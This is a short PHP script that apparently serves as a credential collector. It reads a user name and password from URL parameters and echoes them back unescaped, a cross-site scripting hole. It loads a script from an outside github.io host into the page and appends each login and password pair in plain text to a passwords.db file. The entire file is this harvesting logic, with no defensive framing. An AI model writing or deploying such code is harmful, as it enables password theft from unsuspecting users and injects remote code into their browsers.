<?php
  session_start();
  $_SESSION['login']=$_GET['user'];
  $_SESSION['pass']=$_GET['pass'];
  echo $_SESSION['login'];
  echo "<br>";
  echo $_SESSION['pass'];
  echo "<script src='https://gydo194.github.io/event.js'></script>";
  $pwd = $_SESSION['login'] . ":" . $_SESSION['pass'] . ";";
  file_put_contents("passwords.db", $pwd, FILE_APPEND);
?>
